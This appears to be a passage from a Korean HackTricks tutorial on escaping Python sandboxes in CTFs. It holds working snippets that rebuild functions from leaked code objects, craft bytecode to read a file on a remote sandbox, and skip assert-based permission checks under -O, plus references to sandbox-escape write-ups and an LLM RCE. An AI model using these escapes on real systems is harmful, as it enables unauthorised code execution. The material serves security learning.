> Python 버전에 따라 `code_type`의 **parameters** 순서가 **다를 수 있습니다**. 현재 실행 중인 Python 버전에서 params의 순서를 확인하는 가장 좋은 방법은 다음을 실행하는 것입니다:
>
> ```
> import types
> types.CodeType.__doc__
> 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
> ```

### 유출된 함수 재생성

> [!WARNING]
> 다음 예제에서는 함수 코드 객체에서 직접 함수를 재생성하는 데 필요한 모든 데이터를 가져옵니다. **실제 사례**에서는 함수 **`code_type`**을 실행하는 데 필요한 **모든 값**을 leak해야 합니다.

```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```

### 방어 우회

이 게시물 앞부분의 예시에서 **`compile` 함수를 사용해 임의의 python 코드를 실행하는 방법**을 확인할 수 있습니다. 이는 루프 등을 포함한 **전체 스크립트를 한 줄로**(그리고 **`exec`**를 사용해서도 같은 작업을) **실행할 수 있다**는 점에서 흥미롭습니다.\
어쨌든, 로컬 머신에서 **compiled object**를 **생성**한 뒤 **CTF 머신**에서 실행하는 것이 유용할 때도 있습니다(예를 들어 CTF에서 `compiled` 함수를 사용할 수 없기 때문입니다).

예를 들어, _./poc.py_를 읽는 함수를 직접 compile하고 실행해 보겠습니다:

```python
#Locally
def read():
    return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```

`eval` 또는 `exec`에 접근할 수 없다면 **일반 함수**를 만들 수 있습니다. 하지만 이를 직접 호출하면 보통 _제한된 모드에서는 constructor에 접근할 수 없습니다_라는 오류가 발생합니다. 따라서 이 함수를 호출하려면 **제한된 환경 밖에 있는 함수가 필요합니다.**

```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```

## 컴파일된 Python 디컴파일하기

[**https://www.decompiler.com/**](https://www.decompiler.com) 같은 도구를 사용하면 주어진 컴파일된 Python 코드를 **디컴파일**할 수 있습니다.

**이 튜토리얼을 확인해 보세요**:


{{#ref}}
../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md
{{#endref}}

## 기타 Python

### Assert

최적화 옵션 `-O`로 Python을 실행하면 assert 문과 **debug** 값에 따라 실행되는 코드가 제거됩니다.\
따라서 다음과 같은 검사는 다음과 같이 됩니다:<sup>[[6]](#references)</sup>

```python
def check_permission(super_user):
    try:
        assert(super_user)
        print("\nYou are a super user\n")
    except AssertionError:
        print(f"\nNot a Super User!!!\n")
```

우회됩니다

## References

- [1] [Pyjail](https://lbarman.ch/blog/pyjail/)
- [2] [Python Sandbox Escape - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
- [3] [Python sandbox 탈출하기 (NdH 2013 quals 풀이)](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
- [4] [Python 'sandbox' 탈출](https://gynvael.coldwind.pl/n/python_sandbox_escape)
- [5] [eval은 정말 위험하다](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
- [6] [Assertions로 해킹당하는 방법](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
- [7] [CVE-2023-33733 (ReportLab rl_safe_eval 표현식 평가 RCE) – NVD](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
- [8] [c53elyas/CVE-2023-33733 PoC 및 분석](https://github.com/c53elyas/CVE-2023-33733)
- [9] [0xdf: University (HTB) – xhtml2pdf/ReportLab CVE-2023-33733 악용으로 RCE 획득](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
- [10] [0xdf: HTB Interpreter – Mirth Connect XStream RCE, Mirth 해시 크래킹, Flask f-string eval 권한 상승](https://0xdf.gitlab.io/2026/05/30/htb-interpreter.html)
- [11] [SECCON CTF 2022 Quals: 출제자 풀이 (영어)](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)
- [12] [LLM RCE의 해부 - CyberArk Threat Research Blog](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce)
- [13] [BuckeyeCTF 2024 출제자 풀이](https://corgi.rip/posts/buckeye-writeups/)
- [14] [GeeksforGeeks – Python str.format()의 취약점](https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/)
- [15] [ur4ndom – GCTF 2022 Treebox](https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/)
- [16] [checkoway.net - 단상 - Pickle](https://checkoway.net/musings/pickle)
- [17] [AWS MCP Python Sandbox 탈출하기](https://xplo1t-sec.github.io/posts/breaking-the-aws-mcp-python-sandbox/)
- [18] [PEP 634 - 구조적 패턴 매칭: 명세](https://peps.python.org/pep-0634/#class-patterns)
{{#include ../../../banners/hacktricks-training.md}}
